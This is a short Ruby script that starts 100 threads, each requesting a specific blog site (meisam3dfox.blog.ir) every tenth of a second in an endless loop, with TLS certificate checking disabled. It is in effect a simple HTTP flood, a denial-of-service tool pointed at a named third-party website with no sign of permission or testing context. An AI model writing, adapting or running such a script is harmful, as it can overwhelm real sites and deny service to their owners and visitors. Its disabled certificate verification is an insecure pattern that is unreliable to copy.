require 'net/http'
require 'uri'
require 'concurrent'

# Define the target URL
url = URI('https://meisam3dfox.blog.ir')

# Function to send a GET request
def send_request(url)
  http = Net::HTTP.new(url.host, url.port)

  # If the URL uses HTTPS, set use_ssl to true
  if url.scheme == 'https'
    http.use_ssl = true
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
  end
  request = Net::HTTP::Get.new(url)
  response = http.request(request)
  puts "Resonse code: #{response.code}"
end

# Number of threads to simulate multiple requests
num_threads = 100

# Create a thread pool
pool = Concurrent::FixedThreadPool.new(num_threads)

# Submit tasks to the thread pool
num_threads.times do
  pool.post do
    loop do
      send_request(url)
      sleep(0.1) # Adjust the sleep interval as needed
    end
  end
end

# Shutdown the pool (this will not happen in this case)
pool.shutdown
pool.wait_for_termination
